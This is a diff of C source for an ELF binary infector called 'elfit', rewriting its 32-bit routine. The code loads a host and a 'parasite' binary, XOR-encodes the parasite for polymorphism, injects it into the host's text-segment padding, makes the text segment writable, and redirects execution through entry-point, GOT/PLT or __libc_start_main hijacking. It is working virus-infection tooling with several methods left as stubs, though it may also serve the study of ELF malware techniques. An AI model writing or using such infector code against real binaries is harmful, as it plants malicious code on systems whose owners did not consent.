@@ -1,29 +1,25 @@
 #include "elfit.h"
 
-/*
+
 int elfit32(opts_t *opts)
 {
     Elfit_t host;
     Elfit_t parasite;
     uint32_t malpoint;
     uint32_t patch_pos;
+    uint32_t patch_addr;
+    off_t patch_off;
 
-    printf("[debug] decided to use 32bit infection\n");
-
+    /*
     if (opts->cross_infect)
     {
         opts->cross_infect--;
-        return elfit64(opts);
+        return elfit32(opts);
     }
+    */
 
     if (!opts->host)
     {
-        return -1;
-    }
-
-    if (!opts->patch_pos)
-    {
-        printf("parasite patch position not set\n");
         return -1;
     }
 
@@ -32,70 +28,103 @@ int elfit32(opts_t *opts)
     load_host(opts->host, &host);
     load_host(opts->parasite, &parasite);
 
-    if (opts->textpadding)
+    patch_addr = opts->patch_addr;
+    if (!patch_addr)
     {
-        malpoint = textpadding_inject_32(&host, opts->parasite, 
-            patch_pos, opts->patch_addr);
+        switch(opts->redirection_method)
+        {
+            case ENTRY_REDIR:
+                printf("[+ ENTRYPOINT REDIR]\n");
+                patch_off = entry_redirect_32(&host, &patch_addr);
+                break;
+            case GOT_REDIR:
+                printf("[+ GOT REDIR]\n");
+                patch_off = got_redirect_32(&host, opts->pltsymbol, &patch_addr);
+                break;
+            case CTORS_REDIR:
+                printf("[+ CTORS REDIR]\n");
+                printf("unimplemented redirection method chosen\n");
+                exit(1);
+            case DTORS_REDIR:
+                printf("[+ DTORS REDIR]\n");
+                printf("unimplemented redirection method chosen\n");
+                exit(1);
+            case ARBFUNC_REDIR:
+                printf("[+ ARBFUNC REDIR]\n");
+                printf("unimplemented redirection method chosen\n");
+                exit(1);
+            case STARTMAIN_REDIR:
+                printf("[+ LIBC_START_MAIN REDIR]\n");
+                patch_off = libc_start_main_hijack_32(&host, opts->startmain_mode, &patch_addr);
+                break;
+            default:
+                printf("[-] no redirection method chosen\n");
+                exit(1);
+         }
+    }
 
-    } 
-    else if (opts->reversepadding)
+    printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", patch_addr);
+    if (patch_parasite32(&parasite, patch_pos, patch_addr))
     {
-        printf("chosen injection method not yet implemented\n");
-        return -1;
-    } 
-    else if (opts->soinject)
+        printf("out-of-bounds patch position supplied\n");
+    }
+
+    if (opts->polymorphic_key)
     {
-        printf("chosen injection method not yet implemented\n");
-        return -1;
-    } 
-    else if (opts->etrelinject)
+        printf("[+ POLYMORPHIZING PARASITE]\twith xor key 0x%0x\n", opts->polymorphic_key);
+        parasite_polymorphize32(&parasite, opts->polymorphic_key);
+    }
+
+    /* If we're injecting to the text segment and we're using polymorphism
+     * we must make the text segment writable */
+
+    switch(opts->injection_method)
     {
-        printf("chosen injection method not yet implemented\n");
-        return -1;
+        case TEXT_INJECT:
+            printf("[+ INJECTING PARASITE TO TEXT]\n");
+            malpoint = textpadding_inject_32(&host, &parasite, 
+                patch_pos, opts->patch_addr);
+            reload_host(opts->host, &host);
+            if(opts->polymorphic_key)
+            {
+                printf("[+ TEXT_SEGMENT MOD]\t\tmaking text segment writable for polymorphism\n");
+                make_text_writeable32(&host);
+            }
+            break;
+        case REVERSE_INJECT:
+            printf("[+ INJECTING PARASITE TO TEXT BOTTOM]\n");
+            printf("chosen injection method not yet implemented\n");
+            exit(1);
+            if(opts->polymorphic_key)
+                make_text_writeable32(&host);
+            break;
+        case DATA_INJECT:
+            printf("[+ INJECTION PARASITE INTO DATA SEGMENT]\n");
+            printf("chosen injection method not yet implemented\n");
+            exit(1);
+        case SO_INJECT:
+            printf("[+ CREATING DEPENDENCY TO MALICIOUS LIBRARY]\n");
+            printf("chosen injection method not yet implemented\n");
+            exit(1);
+        case ETREL_INJECT:
+            printf("[+ INJECTING RELOCATABLE]\n");
+            printf("chosen injection method not yet implemented\n");
+            exit(1);
     }
 
     reload_host(opts->host, &host);
 
-    if (opts->entrypoint) 
-    {
-        //entry_redirect_32(&host, malpoint);
-    }
-    else if (opts->gottable)
-    {
-        if (opts->pltsymbol)
-        {
-            //got_redirect_32(&host, opts->pltsymbol, malpoint);
-        }
-        else
-        {
-            printf("chosen redirection method requires symbol to be chosen\n");
-            return -1;
-        }
-    }
-    else if (opts->ctors)
-    {
-        printf("chosen redirection method not yet implemented\n");
-        return -1;
-    }
-    else if (opts->dtors)
-    {
-        printf("chosen redirection method not yet implemented\n");
-        return -1;
-    }
-    else if (opts->arbfunc)
-    {
-        printf("chosen redirection method not yet implemented\n");
-        return -1;
-    }
-    else if (opts->startmain)
-    {
-        //return libc_start_main_hijack_32(&host, malpoint, opts->startmain_mode);
-    }
+    /* this is hacky, but we have to get the patch offset again 
+     * after injection. things may have moved around */
+    if (opts->redirection_method == GOT_REDIR)
+        patch_off = got_redirect_32(&host, opts->pltsymbol, &patch_addr);
+
+    printf("[+ APPLYING REDIRECTION]\n");
+    commit_redirect_32(&host, patch_off, malpoint);
 
     unload_host(&host);
     return 1;
 }
-*/
 
 int elfit64(opts_t *opts)
 {
